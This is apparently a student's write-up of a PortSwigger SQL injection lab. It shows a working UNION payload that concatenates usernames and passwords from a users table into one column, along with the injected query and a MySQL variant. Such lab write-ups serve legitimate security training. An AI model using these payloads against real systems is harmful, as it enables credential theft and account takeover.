# Lab 06 — SQL Injection UNION Attack: Retrieving Multiple Values in a Single Column

**Difficulty:** Practitioner
**Technique:** UNION-based SQLi — string concatenation to extract multiple values
**Lab URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

---

## Vulnerability

The product category filter is vulnerable to UNION-based SQL injection. This lab introduces a constraint — only one column accepts text output. The challenge is extracting two pieces of data (username and password) through a single column by concatenating them into one combined string.

---

## Steps Taken

1. Confirmed the query returns 2 columns but only column 2 accepts text (column 1 is integer-only)
2. Attempted a standard two-column extraction — failed because column 1 rejects strings
3. Adapted the approach — concatenated username and password into a single string with a separator character (`~`) to distinguish them in the output
4. Injected the concatenation payload into column 2 only
5. Response showed combined credentials: `administrator~s3cur3p4ssw0rd`
6. Split on the `~` separator to identify username and password separately
7. Logged in as administrator to complete the lab

---

## Payload Used

```
?category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

**What this does:**
- `||` is Oracle's string concatenation operator
- Combines `username`, a `~` separator, and `password` into one string
- The combined value fits into the single available text column
- Output appears as: `administrator~password123`

**Note:** On MySQL use `CONCAT(username,'~',password)` instead of `||`

---

## Original Query (inferred)

```sql
SELECT id, description FROM products WHERE category = 'Gifts'
```

**After injection:**

```sql
SELECT id, description FROM products WHERE category = 'Gifts'
UNION SELECT NULL, username||'~'||password FROM users--'
```

Both values appear in the description column as one combined string — which the attacker then splits manually.

---

## Why This Technique Matters

Real-world SQL injection scenarios rarely give you ideal conditions. Constraints like:
- Only one text-compatible column available
- Column count limitations
- Data type restrictions

...are common. This lab teaches adaptation — when the straightforward approach fails, combine values, change separators, adjust syntax. The goal stays the same; the method changes.

---

## Real-World Impact

Identical to Lab 05 — full credential extraction leading to account takeover. The difference here is that the attacker worked around a structural constraint to achieve the same outcome.

This demonstrates that SQL injection vulnerabilities are exploitable even when conditions are imperfect. A single injectable column is enough.

---

## Key Takeaway

Concatenation-based extraction is a fundamental technique in UNION attacks. When you cannot use multiple columns, you make one column do the work of many. Understanding how different databases handle string concatenation (`||` vs `CONCAT()` vs `+`) is essential — the right syntax depends entirely on the database platform you are targeting.
